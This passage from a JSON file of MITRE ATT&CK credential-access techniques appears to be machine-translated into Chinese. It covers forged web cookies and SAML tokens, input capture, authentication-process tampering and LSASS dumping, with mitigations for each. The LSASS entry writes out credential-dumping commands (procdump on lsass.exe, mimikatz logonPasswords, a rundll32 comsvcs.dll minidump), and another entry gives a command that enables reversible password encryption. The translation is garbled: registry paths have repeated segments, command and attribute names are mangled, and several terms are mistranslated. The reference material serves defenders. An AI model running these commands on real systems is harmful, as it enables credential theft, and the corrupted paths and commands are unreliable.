          "content": " get-secret-value "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " gcloud Secrets在GCP中的描述"
        },
        {
          "type": "text",
          "content": " <code> az key Vault Secret Shot>在azure。"
        }
      ],
      [
        {
          "type": "text",
          "content": "注意：此技术与云实例元数据API不同，因为凭据是从Cloud Secrets Manager而不是通过实例Metadata API的介质请求的。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制并有权查询Secrets Manager的云帐户和服务的数量。确保有许可的帐户和服务可以查询Secrets Manager，只有可以访问所需的秘密。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1606.001",
    "name": "Web Cookies",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Forge Web Credentials",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会伪造可用于访问Web应用程序或Internet服务的Web Cookie。Web应用程序和服务（在Cloud SaaS环境或本地服务器中托管）经常使用Session Cookie来验证和授权用户访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会生成这些cookie，以便访问Web资源。这不同于窃取Web会话cookie和其他类似行为，因为cookie是新的，并且由对手锻造，而不是从合法用户中被盗或拦截。大多数常见的Web应用程序具有可以使用提供的工具或接口生成的标准化和记录的cookie值。Web Cookie的生成通常需要秘密值，例如密码，私钥或其他加密种子值。"
        }
      ],
      [
        {
          "type": "text",
          "content": "一旦锻造，对手可能会使用这些Web Cookie访问资源（Web Session Cookie），该资源可能绕过多因素和其他身份验证保护机制。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "管理员应对所有访问列表进行审核，以及授予访问Web应用程序和服务的权限。这应该在所有资源上进行广泛进行，以建立基线，然后对新资源进行定期审核。可疑帐户/凭据应进行调查和删除。"
            }
          ]
        ]
      },
      {
        "id": "M1054",
        "name": "软件配置",
        "description": [
          [
            {
              "type": "text",
              "content": "将浏览器/应用程序配置为定期删除持续的Web Cookie。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1606.002",
    "name": "SAML Tokens",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Forge Web Credentials",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "如果对手拥有有效的SAML代币签名证书，则可以使用任何权限索赔和一生。SAML令牌的默认寿命为一个小时，但是有效期可以在"
        },
        {
          "type": "code",
          "content": " notonorafter "
        },
        {
          "type": "text",
          "content": " </code>条件的值中指定，"
        },
        {
          "type": "code",
          "content": "条件... "
        },
        {
          "type": "text",
          "content": " element a在令牌中。可以使用"
        },
        {
          "type": "code",
          "content": " lifetimetokenpolicy "
        },
        {
          "type": "text",
          "content": "中的"
        },
        {
          "type": "code",
          "content": " AccessTokenLifetime "
        },
        {
          "type": "text",
          "content": "更改此值。锻造的SAML令牌使对手能够在使用SAML 2.0作为SSO（单登录）机制的服务中对对手进行身份验证。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以利用私钥来妥协组织的令牌证书来创建伪造的SAML令牌。如果对手有足够的权限可以使用自己的Active Directory Federation Services（AD FS）服务器建立新的联邦信托，则他们可以生成自己可信赖的令牌标记证书。这不同于窃取应用程序访问令牌和其他类似行为，因为令牌是新的，并且由对手锻造，而不是从合法用户中被盗或拦截。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果对SAML令牌伪造，则对手可能会获得行政azure AD特权，该特权声称代表高度特权帐户。这可能会导致使用替代身份验证材料，这可能绕过多因素和其他身份验证保护机制。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1015",
        "name": "Active Directory配置",
        "description": [
          [
            {
              "type": "text",
              "content": "为了包含先前锻造的SAML令牌的影响，请两次旋转标记签名的AD FS证书，这将使使用先前证书生成的任何代币无效。"
            }
          ]
        ]
      },
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "在广告fs上启用高级审核。在AD FS管理快照中检查成功和故障审核选项。通过小组策略对象在AD FS Farm上启用审核应用程序生成的事件。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制权限和对AD FS服务器的访问仅来自特权访问工作站。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "确保具有行政权利的用户帐户遵循最佳实践，包括使用特权访问工作站，及时/恰到足够的管理（JIT/JEA）和强大的身份验证。减少具有高度特权目录角色成员的用户数量。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1056.001",
    "name": "Keylogging",
    "tactics": [
      {
        "id": "TA0009",
        "name": "Collection"
      },
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Input Capture",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以在用户键入时记录用户击键以拦截凭据。当OS凭据倾销工作无效时，KeyLogging可能会用于获得新的访问机会的证书，并且可能需要对手在很长一段时间内拦截在系统上的击键，然后才能成功捕获凭证。为了增加快速捕获证书的可能性，对手也可以执行诸如清除浏览器cookie以迫使用户重新验证系统的操作。"
        }
      ],
      [
        {
          "type": "text",
          "content": "钥匙扣是最普遍的输入捕获类型，具有许多不同的拦截击键的方式。一些方法包括："
        }
      ],
      [
        {
          "type": "list",
          "content": "挂钩API回调用于处理击键。与凭证挂钩不同，这仅着重于用于处理击键数据的API函数。"
        },
        {
          "type": "list",
          "content": "从硬件缓冲区读取原始击键数据。"
        },
        {
          "type": "list",
          "content": "Windows注册表修改。"
        },
        {
          "type": "list",
          "content": "自定义驱动程序。"
        },
        {
          "type": "list",
          "content": "修改系统图像可能会为对手提供钩子进入网络设备的操作系统，以读取用于登录会话的原始击键。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1056.002",
    "name": "GUI Input Capture",
    "tactics": [
      {
        "id": "TA0009",
        "name": "Collection"
      },
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Input Capture",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会模仿通用操作系统GUI组件，以提示用户以看似合理的提示来获取凭据。当执行需要额外特权的程序比当前用户上下文中存在的其他特权时，操作系统通常提示用户适当的凭据授权任务的高架特权（例如：旁路用户帐户控制）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会模仿此功能，以提示用户获得凭据合法提示的凭据，原因是许多原因模仿了正常使用情况，例如需要额外访问或假装恶意软件删除套件的伪造安装程序。这种类型的提示可用于通过各种语言（例如AppleScript和PowerShell）收集凭据。在Linux系统上，对手可以启动对话框，以提示用户获得恶意壳脚本或命令行（即Unix Shell）的凭据。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "使用用户培训来引起人们的意识并引起对潜在的恶意事件和对话框的怀疑（例如：办公文件，提示凭证）。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1056.003",
    "name": "Web Portal Capture",
    "tactics": [
      {
        "id": "TA0009",
        "name": "Collection"
      },
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Input Capture",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以在外部面向门户（例如VPN登录页面）上安装代码，以捕获和传输试图登录服务的用户的凭据。例如，在将用户登录到服务之前，可能会记录提供的用户凭据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以使用合法的管理访问作为备份措施来进行输入捕获的这种变化，以通过外部远程服务和有效帐户维护网络访问，也可以通过利用外部面对的Web服务来维护网络访问。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "请勿允许具有许可的管理员帐户来修改组织登录门户的Web内容，用于日常操作，这些操作可能会使它们暴露于无私人系统上的潜在对手。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1056.004",
    "name": "Credential API Hooking",
    "tactics": [
      {
        "id": "TA0009",
        "name": "Collection"
      },
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Input Capture",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以将Windows应用程序编程接口（API）功能挂钩以收集用户凭据。恶意挂钩机制可能会捕获包含参数的API调用，这些参数揭示了用户身份验证凭据。与KeyLogging不同，该技术专门针对API函数，其中包含显示用户凭据的参数。钩子涉及将调用调用到这些功能，并且可以通过以下方式实现："
        }
      ],
      [
        {
          "type": "list",
          "content": "挂钩过程，该过程响应诸如消息，击键和鼠标输入等事件的事件，拦截和执行指定的代码。"
        },
        {
          "type": "list",
          "content": "导入地址表（IAT）挂钩，对过程的IAT进行了修改，在其中存储了指向导入的API函数的指针。"
        },
        {
          "type": "list",
          "content": "Inline挂钩，覆盖API函数中的第一个字节以重定向代码流。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1556.001",
    "name": "Domain Controller Authentication",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Modify Authentication Process",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以在域控制器上修补身份验证过程，以绕过典型的身份验证机制并启用访问帐户。"
        }
      ],
      [
        {
          "type": "text",
          "content": "恶意软件可用于将虚假凭据注入域控制器的身份验证过程中，目的是创建用于访问任何用户帐户和/或凭据的后门（例如：skeleton键）。Skeleton密钥通过企业域控制器身份验证过程（LSASS）的补丁程序，具有对手可以用来绕过标准身份验证系统的凭据。修补后，对手可以使用注入的密码成功身份验证任何域用户帐户（直到域控制器的重新启动从内存中删除骨架键）。身份验证的访问可以使单因素身份验证环境中对主机和/或资源的不受限制访问。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "将多因素身份验证（MFA）整合为组织政策的一部分，可以大大降低对手获得对有效凭证的控制的风险，这些凭据可用于其他策略，例如初始访问，横向移动和收集信息。MFA也可以用于限制对云资源和API的访问。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "审计域和本地帐户以及其许可级别通常会寻找可以通过获得特权帐户的凭据来获得广泛访问的情况。如果启用了默认帐户，或者创建尚未授权的新本地帐户，这些审核也应包括在内。遵循企业网络设计和管理的最佳实践，以限制行政层的特权帐户使用。"
            }
          ]
        ]
      },
      {
        "id": "M1025",
        "name": "特权过程完整性",
        "description": [
          [
            {
              "type": "text",
              "content": "启用功能，例如LSA的受保护的过程灯（PPL）。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1556.002",
    "name": "Password Filter DLL",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Modify Authentication Process",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以将恶意密码过滤器动态链接库（DLL）注册到身份验证过程中，以在验证时获取用户凭据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Windows密码过滤器是域和本地帐户的密码策略执行机制。过滤器被实现为包含一种针对密码策略验证潜在密码的方法。滤波器DLL可以放在本地计算机上，用于本地帐户和/或域帐户的域控制器。在安全客户经理（SAM）中注册新密码之前，本地安全管理局（LSA）请求每个注册过滤器的验证。在每个注册过滤器确认验证之前，任何潜在的更改都无法生效。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以注册恶意密码过滤器，以从本地计算机和/或整个域收获凭据。要执行适当的验证，过滤器必须从LSA获得普通文本凭据。每次提出密码请求时，恶意密码过滤器都会收到这些普通文本凭据。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "确保仅注册有效的密码过滤器。Windows安装目录中必须存在过滤器dll（默认情况下的C：\\ Windows \\ System32 \\）和/或本地计算机，该计算机在HKEY_LOCAL_MACHINE \\ SYSTEM \\ currentControlset \\ CurrentControlSet \\ LSA \\ LSA \\ Notification Package中具有相应的条目。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1556.003",
    "name": "Pluggable Authentication Modules",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Modify Authentication Process",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以修改可插入身份验证模块（PAM）以访问用户凭据，或启用原本无理的对帐户的访问。PAM是一个模块化的配置文件，库和可执行文件的系统系统，可指导许多服务的身份验证。最常见的身份验证模块是"
        },
        {
          "type": "code",
          "content": " pam_unix.so "
        },
        {
          "type": "text",
          "content": "，它在"
        },
        {
          "type": "code",
          "content": "/etc/etc/passwd "
        },
        {
          "type": "text",
          "content": "和<code>/etc/etc/etcs </code中检索，集合和验证帐户身份验证信息>。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以修改PAM系统的组件以创建后门。PAM组件，例如"
        },
        {
          "type": "code",
          "content": " pam_unix.so "
        },
        {
          "type": "text",
          "content": "，可以修补以接受任意的对手提供的值作为合法的凭据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对PAM系统的恶意修改也可能被滥用以窃取凭据。对手可以用代码感染PAM资源以收获用户凭据，因为与PAM组件交换的值可能是普通文本，因为PAM不存储密码。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "将多因素身份验证（MFA）整合为组织政策的一部分，可以大大降低对手获得对有效凭证的控制的风险，这些凭据可用于其他策略，例如初始访问，横向移动和收集信息。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制对根帐户的访问，并防止用户通过适当的特权分离（Ex selinux，grsecurity，apparmor等）修改PAM组件，并限制特权升级机会。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1556.004",
    "name": "Network Device Authentication",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Modify Authentication Process",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以使用补丁系统图像来硬编码操作系统中的密码，从而绕过网络设备上本地帐户的本地身份验证机制。"
        }
      ],
      [
        {
          "type": "text",
          "content": "修改系统映像可能包括向操作系统的网络设备的植入代码，以使用特定密码为对手提供访问权限。修改包括一个特定的密码，该密码通过补丁植入了操作系统图像。经过身份验证尝试后，插入的代码将首先检查以查看用户输入是否是密码。如果是这样，将授予访问权限。否则，植入的代码将通过凭据来验证潜在有效的凭据。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "为用户和特权帐户使用多因素身份验证。大多数嵌入式网络设备都支持TACACS+和/或半径。遵循供应商处方的最佳实践，以硬化访问控制。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "遵循最少的特权原则，将管理员帐户限制在尽可能少的个人中。防止管理员和特权帐户系统之间的凭据重叠，特别是在网络和非网络平台之间，例如服务器或端点。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1556.005",
    "name": "Reversible Encryption",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Modify Authentication Process",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用Active Directory认证加密属性，以获取Windows系统上的凭据。"
        },
        {
          "type": "code",
          "content": "允许Reverversible passwordecryption "
        },
        {
          "type": "text",
          "content": "属性指定帐户的可逆密码加密是启用还是禁用。默认情况下，该属性被禁用（取而代之的是将用户凭据作为单向哈希功能的输出），除非旧版或其他软件都需要它，否则不应启用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果启用该属性并在启用密码后更改其密码，则对手可能能够在启用属性后获取创建/更改的密码的明文。要解密密码，对手需要四个组件："
        }
      ],
      [
        {
          "type": "text",
          "content": "有了这些信息，对手可能能够重现加密密钥，然后解密加密的密码值。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过本地组策略编辑器，用户属性，细粒密码策略（FGPP）或通过Activedirectory PowerShell模块将此属性设置为各种范围。例如，如果域功能级别设置为“ Windows Server 2008”或更高版本，则对手可以实现并将FGPP应用于用户或组。在PowerShell中，对手可以使用类似于"
        },
        {
          "type": "code",
          "content": " Set -Aduser -AllowReversible passwordectryption $ true "
        },
        {
          "type": "text",
          "content": "的命令对用户设置进行关联更改。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "确保"
            },
            {
              "type": "code",
              "content": "允许Reverversible passwordectigning "
            },
            {
              "type": "text",
              "content": "将属性设置为禁用，除非有应用程序要求。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "审计域和本地帐户以及其许可级别通常会寻找可以通过获得特权帐户的凭据来获得广泛访问的情况。如果启用了默认帐户，或者创建尚未授权的新本地帐户，这些审核也应包括在内。遵循企业网络设计和管理的最佳实践，以限制行政层的特权帐户使用。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1556.006",
    "name": "Multi-Factor Authentication",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Modify Authentication Process",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会禁用或修改多因素身份验证（MFA）机制，以使持续访问受损害的帐户访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "一旦对手通过损害缺乏MFA的帐户或采用MFA旁路方法（例如多因素身份验证请求生成生成）来获得对网络的访问，对手可能会利用其修改或完全禁用MFA防御的访问权限。这可以通过滥用合法功能来完成，例如将用户排除在Azure AD条件访问策略之外，注册新的但脆弱的/对手控制的MFA方法，或者通过手动修补MFA程序和配置文件来绕过预期的功能。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，将Windows Hosts文件（"
        },
        {
          "type": "code",
          "content": " c：\\ Windows \\ System32 \\ eetc \\ etc hosts "
        },
        {
          "type": "text",
          "content": "）修改以将MFA调用重定向到Localhost而不是MFA服务器可能会导致MFA进程失败。如果制定“失败的打开”策略，则可以在无执行MFA的情况下授予任何其他成功的身份验证尝试。"
        }
      ],
      [
        {
          "type": "text",
          "content": "根据对手的范围，目标和特权，MFA防御可能会用于单个帐户或与较大群体相关的所有帐户，例如受害者网络环境中的所有域帐户。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "查看MFA操作以及身份验证日志，以确保基于MFA的登录按预期运行。查看用户帐户，以确保所有帐户都启用了MFA。"
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "确保对现有，停用或休眠的帐户和设备的MFA和MFA政策和要求正确实施。如果可能的话，请考虑在发生严重错误的情况下将MFA解决方案配置为“失败”，而不是授予访问。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "确保实施适当的政策，以决定用户帐户的MFA的安全入学和停用。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1556.007",
    "name": "Hybrid Identity",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Modify Authentication Process",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以修补，修改或以其他方式进行后门云身份验证过程，这些过程与本地用户身份相关，以绕过典型的身份验证机制，访问凭据，并启用对帐户的持续访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "许多组织维护在本地和基于云的环境之间共享的混合用户和设备身份。这些可以通过多种方式维护。例如，Azure AD包括三个用于同步Active Directory和Azure AD之间的身份的选项："
        }
      ],
      [
        {
          "type": "list",
          "content": "密码哈希同步（PHS），其中特权本地帐户同步了Active Directory和Azure AD之间的用户密码哈希，从而使Azure AD的身份验证完全在云中进行"
        },
        {
          "type": "list",
          "content": "通过身份验证（PTA），将Azure AD身份验证尝试转发给本地PTA代理，该代理验证了针对Active Directory的凭据"
        },
        {
          "type": "list",
          "content": "Active Directory Federation Services（AD FS），其中Active Directory和Azure AD之间建立了信任关系"
        }
      ],
      [
        {
          "type": "text",
          "content": "AD FS也可以与其他SaaS和云平台（如AWS和GCP）一起使用，AWS和GCP将把身份验证过程移交给AD FS并接收包含混合用户的身份和特权的令牌。"
        }
      ],
      [
        {
          "type": "text",
          "content": "通过修改与混合身份相关的身份验证过程，对手可能能够建立对云资源的持续特权访问。例如，损害运行PTA代理的本地服务器的对手可以将恶意DLL注入"
        },
        {
          "type": "code",
          "content": " azureadConnectAuthenticationAgenticagentservice "
        },
        {
          "type": "text",
          "content": "处理所有尝试对Azure AD进行身份验证的尝试，以及记录用户凭证。在使用AD FS的环境中，对手可以编辑"
        },
        {
          "type": "code",
          "content": " Microsoft.IdentityServer.ServiceHost "
        },
        {
          "type": "text",
          "content": "配置文件，以加载一个恶意DLL，该恶意DLL为任何具有任何索赔的用户生成身份验证令牌定义的AD FS政策。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在某些情况下，对手可能能够从云中修改混合身份身份验证过程。例如，在Azure AD租户中妥协全局管理员帐户的对手可能能够通过Web控制台注册新的PTA代理，同样允许他们作为任何用户收获凭据并将其登录到Azure AD环境中。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "定期查看用于任何差异的混合身份解决方案。例如，查看Azure Management门户中的所有PTA代理，以识别任何不需要的或未批准的PTA代理。如果使用ADF，请在AD FS和全局汇编缓存目录中查看DLL和可执行文件，以确保它们由Microsoft签名。请注意，在某些情况下，二进制文件可能是符号签名的，这可能会导致该文件在查看文件属性时出现未签名。"
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "多因素身份验证",
        "description": [
          [
            {
              "type": "text",
              "content": "将多因素身份验证（MFA）整合为组织政策的一部分，可以大大降低对手获得对有效凭证的控制的风险，这些凭据可用于其他策略，例如初始访问，横向移动和收集信息。MFA也可以用于限制对云资源和API的访问。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制本地帐户，并访问了对混合身份解决方案的访问。例如，将Azure AD全局管理员帐户仅限于所需的帐户，并确保这些帐户是专用的仅云帐户而不是混合帐户。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1556.008",
    "name": "Network Provider DLL",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Modify Authentication Process",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以注册恶意网络提供商动态链接库（DLL），以在身份验证过程中捕获ClearText用户凭据。网络提供商DLL允许Windows与特定的网络协议交互，还可以支持附加凭据管理功能。在登录过程中，Winlogon（交互式登录模块）通过RPC将凭据发送到本地"
        },
        {
          "type": "code",
          "content": " mpnotify.exe "
        },
        {
          "type": "text",
          "content": "过程。"
        },
        {
          "type": "code",
          "content": " mpnotify.exe "
        },
        {
          "type": "text",
          "content": "过程然后在通知登录事件发生时与已注册的凭据管理者在ClearText中共享凭据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以配置恶意网络提供商DLL，以从"
        },
        {
          "type": "code",
          "content": " mpnotify.exe "
        },
        {
          "type": "text",
          "content": "接收凭据。一旦安装为凭证管理器（通过注册表），恶意DLL每次用户通过"
        },
        {
          "type": "code",
          "content": " nplogonnotify（）"
        },
        {
          "type": "text",
          "content": "函数登录到Windows Workstation或域上时都可以接收并保存凭据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会针对已知增加登录活动和/或管理员登录活动（例如服务器和域控制器）的系统，以种植恶意网络提供商DLL为目标。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "定期审查注册表中的新的和未知的网络提供商DLL（"
            },
            {
              "type": "code",
              "content": " hkey_local_machine \\ system \\ currentControlset \\ services \\ services \\ <networkProvidername> \\ networkProvider \\ networkProvider \\ provider \\ providerpath "
            },
            {
              "type": "text",
              "content": "）。"
            }
          ],
          [
            {
              "type": "text",
              "content": "确保仅注册有效的网络提供商DLL。这些名称可以在注册表密钥中找到"
            },
            {
              "type": "code",
              "content": " hkey_local_machine \\ system \\ currentControlset \\ currentControlset \\ control \\ networkProvider \\ order \\ order </code </code "
            },
            {
              "type": "text",
              "content": " </code>，并且在"
            },
            {
              "type": "code",
              "content": " hkey_local_machine \\ currentc ontrololset \\ currentc ontroloset controlsect ot trolsy \\ code subkey指向dll\\ services \\ <NetworkProviderName> \\ NetworkProvider "
            },
            {
              "type": "text",
              "content": "。"
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "从Windows 11 22H2开始，可以通过组策略或通过配置服务提供商禁用"
            },
            {
              "type": "code",
              "content": " enablemprnotifications "
            },
            {
              "type": "text",
              "content": "策略，以防止Winlogon向网络提供商发送凭据。"
            }
          ]
        ]
      },
      {
        "id": "M1024",
        "name": "限制注册表许可",
        "description": [
          [
            {
              "type": "text",
              "content": "限制注册表权限，禁止修改敏感注册表密钥，例如"
            },
            {
              "type": "code",
              "content": " hkey_local_machine \\ system \\ currentControlset \\ control \\ control \\ networkProvider \\ order \\ order \\ order "
            },
            {
              "type": "text",
              "content": "。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1003.001",
    "name": "LSASS Memory",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "OS Credential Dumping",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以尝试访问存储在本地安全局子系统服务（LSASS）过程内存中的凭证材料。用户登录后，系统将在LSASS过程内存中生成并存储各种凭据材料。这些凭证材料可以由行政用户或系统收获，并用于使用替代身份验证材料进行侧向移动。"
        }
      ],
      [
        {
          "type": "text",
          "content": "除内存技术外，LSASS过程内存可以从目标主机中倾倒并在本地系统上进行分析。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，在目标主机上使用procdump："
        }
      ],
      [
        {
          "type": "list",
          "content": "procdump -ma lsass.exe lsass_dump"
        }
      ],
      [
        {
          "type": "text",
          "content": "在本地，可以使用以下方式运行mimikatz"
        }
      ],
      [
        {
          "type": "list",
          "content": "sekurlsa :: minidump lsassdump.dmp"
        },
        {
          "type": "list",
          "content": "Sekurlsa :: logonPasswords"
        }
      ],
      [
        {
          "type": "text",
          "content": "也可以使用内置的Windows工具，例如Comsvcs.dll："
        }
      ],
      [
        {
          "type": "list",
          "content": "rundll32.exe c：\\ windows \\ system32 \\ comsvcs.dll minidump pid lsass.dmp full"
        }
      ],
      [
        {
          "type": "text",
          "content": "Windows安全支持提供商（SSP）DLL在系统启动时加载到LSASS进程中。加载到LSA中后，SSP DLL可以访问存储在Windows中的加密和明文密码，例如任何已记录的用户域密码或智能卡引脚。The SSP configuration is stored in two Registry keys: "
        },
        {
          "type": "code",
          "content": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages"
        },
        {
          "type": "text",
          "content": " and "
        },
        {
          "type": "code",
          "content": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages"
        },
        {
          "type": "text",
          "content": "。对手可以修改这些注册表键以添加新的SSP，该键将在下次系统启动时或添加SecurityPackage Windows Windows API函数时加载。"
        }
      ],
      [
        {
          "type": "text",
          "content": "以下SSP可用于访问凭据："
        }
      ],
      [
        {
          "type": "list",
          "content": "MSV：通过MSV身份验证软件包完成交互式登录，批处理登录和服务登录。"
        },
        {
          "type": "list",
          "content": "wdigest：Digest身份验证协议旨在与超文本传输协议（HTTP）和简单身份验证安全层（SASL）交换一起使用。"
        },
        {
          "type": "list",
          "content": "Kerberos：在Windows 2000和更高版本中的共同客户服务器域身份验证中，首选。"
        },
        {
          "type": "list",
